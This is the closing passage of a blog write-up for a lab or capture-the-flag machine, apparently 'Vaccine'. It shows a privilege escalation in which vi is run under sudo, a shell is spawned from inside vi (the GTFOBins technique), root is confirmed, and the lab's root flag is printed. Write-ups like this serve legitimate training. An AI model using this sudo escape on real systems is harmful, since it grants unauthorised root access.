+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/vi/">https://gtfobins.github.io/gtfobins/vi/</a></p>
+<p><img src="/../vaccine_img/6.png" alt="alt text"></p>
+<pre><code class="hljs bash">vi
+:<span class="hljs-built_in">set</span> shell=/bin/sh
+:shell</code></pre>
+
+<p>→ run this</p>
+<pre><code class="hljs bash">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></pre>
+
+<p>shift + <code>:</code> set shell&#x3D;&#x2F;bin&#x2F;sh</p>
+<p><img src="/../vaccine_img/7.png" alt="alt text"></p>
+<p>→ <code>return</code> → esc → &#96;shel&#96;&#96; → return </p>
+<p><img src="/../vaccine_img/8.png" alt="alt text"></p>
+<p>→ We got root:</p>
+<p><img src="/../vaccine_img/9.png" alt="alt text"></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># whoami</span>
+root
+<span class="hljs-comment"># cd /root</span>
+<span class="hljs-comment"># ls</span>
+pg_hba.conf  root.txt  snap
+<span class="hljs-comment"># cat root.txt</span>
+dd6e058e814260bc70e9bbdef2715849</code></pre>
+
+<p>Root flag: <code>dd6e058e814260bc70e9bbdef2715849</code></p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2024/05/24/Oopsie/" title="Oopsie"><span class="has-text-weight-semibold">Next: Oopsie</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/razvan-popa-333740293"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Rãzvan 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
